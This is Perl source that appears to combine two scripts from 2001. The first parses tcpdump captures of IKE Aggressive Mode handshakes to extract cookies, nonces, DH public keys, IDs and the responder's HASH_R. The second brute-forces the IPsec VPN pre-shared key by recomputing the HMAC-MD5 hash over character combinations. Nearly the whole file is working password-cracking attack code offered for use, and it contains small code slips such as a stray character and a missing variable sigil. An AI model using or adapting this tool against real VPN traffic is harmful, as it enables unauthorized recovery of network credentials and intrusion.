#!/usr/bin/perl

# snarf.pl
# By Anton T. Rager - 08/06/2001
# Parses tcpdump -xq file to extract IKE info for calculating SKEYID and HASH_R

# strip first 28 bytes [IP + UDP header]
# store next 8 bytes in cookie_i
# if next 8 are zero - init packet
# nxt byte - indicates nxt payload
# skip one byte - 1 byte for xchng type - aggressive - 4
# skip 5 bytes - 4 bytes for IKE Len
# Payload [probably SA proposal, but depends on value in nxtpayload]
# -- nxt payload = 1 byte
# -- len - 2 bytes [include nxtpayload and len fields]


# Payload values
# - 0 none
# - 4 KE
# - 5 ID
# - 8 Hash
# - 10 Nonce

#findhost is IKE initiator


$findhost=@ARGV[0];
if (!$findhost) {
	print("Usage:  ikecrack-snarf.pl <initiator_ip.port>\n\n  Example: ikecrack-snarf.pl 10.10.10.10.500\n");
	exit;
}

print("Looking for Initiator : $findhost\n");
#logfile.dat is saved output from tpcdump : ie "tcpdump -nxq port 500 > logfile.dat"
if (! -r "logfile.dat") {
	print("logfile.dat does not exist in current directory.\n\n--Create logfile.dat with tcpdump in the following manner:\n  tcpdump -nxq > logfile.dat\n");
	exit;
}
open(TEST, "logfile.dat");
@logfile = <TEST>;
close(TEST);


$match=0;

$aggr=0;
$init=0;
$matchcnt=0;
$hexdone=0;
$init="";
$resp="";

foreach $parserec (@logfile) {
	if (substr($parserec, 0,1) != " ") {

		if ($hexstart) {
			$hexstart=0;
			$hexdone=1;
			if ($matchcnt eq 0) {
				print("Init\n");
				$ike = substr($init, 56);
			}
			if ($matchcnt eq 1) {
				print("Resp\n");
				$ike = substr($resp, 56);
			}
                                $ptr= 0;
                                $tcookie_i = substr($ike, $ptr, 16);
                                print("tcookie_i : $tcookie_i\n");
                                $ptr=$ptr+16;
                                $tcookie_r = substr($ike, $ptr, 16);
                                print("tcookie_r : $tcookie_r\n");
                                if ($tcookie_r ne "0000000000000000" && $matchcnt eq 0) {
                                	print("Error : Non-Zero Cookie responder cookie with initiator packet\n");
                                	exit;
                                }
				if (matchcnt eq 1) {
					if ($cookie_i ne $tcookie_i) {
						print("Error : Initiator Cookie mismatch with response\n");
						exit;
						
					}
				}
				$cookie_i = $tcookie_i;
				$cookie_r = $tcookie_r;

                                $ptr = $ptr +16;
                                $nxt_pld = substr($ike, $ptr, 2);
                                #print("nxt_pld  : $nxt_pld\n");
                                $ptr = $ptr + 4;
                                $xchg = substr($ike, $ptr, 2);
                                print("xchg type: $xchg\n");
                                if ($xchg eq "04") {
                                	print("Aggressive Mode - Continue\n");
                                } else {
					print("Error : Not Aggressive Mode\n");
                                	exit;
                                }
				if ($xchg eq "05") {
					print("Error : Informational Packet\n");
					exit;
				}
                                $ptr = $ptr + 12;
                                $ikelen = hex(substr($ike, $ptr, 8));
                                #print("ikelen   : $ikelen\n");
                                $ptr = $ptr + 8;
                                while ($nxt_pld ne "00") {
                                	$this_pld = $nxt_pld;
                                	$nxt_pld = substr($ike, $ptr, 2);
                                	$ptr = $ptr + 4;
                                	$pld_len = hex(substr($ike, $ptr, 4));
                                	$ptr = $ptr + 4;
                                	$payload = substr($ike, $ptr, $pld_len*2-8);
                                       	if ($this_pld eq "01") {

                                		
						if ($matchcnt) {
                                			$SA_r = $payload;
							print("SA_r    : $SA_r\n");
							#check for matching proposal with MD5?
						} else {
							$SA_i = $payload;
							print("SA_i    : $SA_i\n");
						}                                     c
                                	}
                                	
                                	if ($this_pld eq "04") {
						if ($matchcnt) {
                                			$dhpub_r = $payload;
							print("KE_r    : $dhpub_r\n");

						} else {
							$dhpub_i = $payload;
							print("KE_i    : $dhpub_i\n");
						}
#                                		print("KE    : $payload\n");
#                                		$dhpub_i = $payload;
                                	}
                                	if ($this_pld eq "05") {
						if ($matchcnt) {
                                			$ID_r = $payload;
							print("ID_r    : $ID_r\n");

						} else {
	                                		if (length($payload) eq 48) {
	                                			print("ID seems to be SHA1 hash - Nortel Client?\n");
	                                			exit;
	                                		}
        						$ID_i = $payload;
							print("ID_i    : $ID_i\n");
						}
                                	}
                                	if ($this_pld eq "08") {
						$RX_HASH_R = $payload;
                                		print("HASH_r  : $RX_HASH_R\n");
                                	}
                                	if ($this_pld eq "0a") {
						if ($matchcnt) {
                                			$nonce_r = $payload;
							print("nonce_r    : $nonce_r\n");

						} else {
							$nonce_i = $payload;
							print("nonce_i    : $nonce_i\n");
						}

                                	}
					if ($this_pld eq "0b") {
						print("Ntfy   : $payload\n");	
					}
                                	        $ptr = $ptr + ($pld_len*2-8);
                                	}
                                	print("\n\n");

		}
		
		@heading=split(" ", $parserec);
		print("Header IPs $heading[1] $heading[3]\n");
		if (!$match) {
			#$hd3tmp=$heading[3];
			chop($heading[3]);
			if ($heading[1] eq $findhost) {
				# if ($heading[1] eq $findhost || $hd3tmp eq $findhost) {
 				$ip1=$heading[1];
				$ip2=$heading[3];
				
				$match=1;
				$hexdone=0;
				print("Matching Header $ip1 $ip2\n");
				$initIP = "$heading[1] $heading[3]";
			
			}
		} else {
			$matchcnt++;
                        if ($matchcnt < 2) {
				$hexdone=0;
				#$hd3tmp=$heading[3];
				chop($heading[3]);
				if ($heading[1] eq $ip2 && $heading[3] eq  $ip1) {
					print("Reply Header? $heading[1] $heading[3]\n");
					$respIP = "$heading[1] $heading[3]";
 			 	}
			}

		}

	} else {
		if ($match && $matchcnt < 2 && !$hexdone) {
			$hexstart=1;
			@hexdump=split(" ", $parserec);
			foreach $hexrec (@hexdump) {
				if ($matchcnt eq 0) {
					$init= $init . $hexrec;
				}
				if ($matchcnt eq 1) {
					$resp = $resp . $hexrec;
				}
			}
		}
	

	}
}

#!/usr/bin/perl

use Digest::HMAC_MD5 qw(hmac_md5 hmac_md5_hex);

# ikecrack.pl - Anton Rager, July 6 2001
#
# This program takes IKE Aggressive Mode data and tries to determine the PSK by brute force
# Program takes HASH_R from responder and collects Cookies, DH Pubkeys, Initiator SA, Nonces, and Responder ID to
# calculate HASH_R via bruteforcing PSK.
#


$noncedata = $nonce_i . $nonce_r;
$hashdata_r = $dhpub_r . $dhpub_i . $cookie_r . $cookie_i . $SA_i . $ID_r;

# Lcase
#@charset = ("a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z");
# UCase
#@charset = ("A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z");
# Nums
#@charset = ("0","1","2","3","4","5","6","7","8","9");
# LCase + Nums + Ucase
@charset = ("a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z",
"0","1","2","3","4","5","6","7","8","9",
"A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z");


# Pre-Processing of input data to convert from hex to characters

 for ($y=0; $y<length($noncedata); $y=$y+2) {
	$tmp = chr(hex(substr($noncedata, $y, 2)));
 	$noncedata_char = $noncedata_char . $tmp;
 }



 for ($y=0; $y<length($hashdata_r); $y=$y+2) {
	$tmp = chr(hex(substr($hashdata_r, $y, 2)));
 	$hashdatar_char = $hashdatar_char . $tmp;
 }

# End Pre-Processing
#
#
# Start Bruteforce Loops



$starttime = time();
print ("Sent MD5 HASH_R : $RX_HASH_R\n");


foreach $char1 (@charset) {
	foreach $char2 (@charset) {
		foreach $char3 (@charset) {
			$brutekey = $char1 . $char2 . $char3;
			$SKEY_char = hmac_md5($noncedata_char, $brutekey);
			$MD_HASH_R = hmac_md5_hex($hashdatar_char, $SKEY_char);

			if ($RX_HASH_R eq $MD_HASH_R) {
				print ("match with $brutekey\n");
				print ("Calc MD5 HASH_R : $MD_HASH_R\n");
				$SKEY_hex = hmac_md5_hex($noncedata_char, $brutekey);
				print ("Calc SKEYID : $SKEY_hex\n");
			}

		}
		$brutekey = $char1 . $char2 . $char3;
		$SKEY_char = hmac_md5($noncedata_char, $brutekey);
		$MD_HASH_R = hmac_md5_hex($hashdatar_char, $SKEY_char);

		if ($RX_HASH_R eq $MD_HASH_R) {
			print ("match with $brutekey\n");
			print ("Calc MD5 HASH_R : $MD_HASH_R\n");
			$SKEY_hex = hmac_md5_hex($noncedata_char, $brutekey);
			print ("Calc SKEYID : $SKEY_hex\n");
		}
	}
	$brutekey = $char1 . $char2 . $char3;
	$SKEY_char = hmac_md5($noncedata_char, $brutekey);
	$MD_HASH_R = hmac_md5_hex($hashdatar_char, $SKEY_char);

	if ($RX_HASH_R eq $MD_HASH_R) {
		print ("match with $brutekey\n");
		print ("Calc MD5 HASH_R : $MD_HASH_R\n");
		$SKEY_hex = hmac_md5_hex($noncedata_char, $brutekey);
		print ("Calc SKEYID : $SKEY_hex\n");
	}

}

$elapsedtime = time()-$starttime;
$kps = 238328/$elapsedtime;

print ("Elapsed Time : $elapsedtime seconds   KPS : $kps\n");

# End Bruteforce Loops

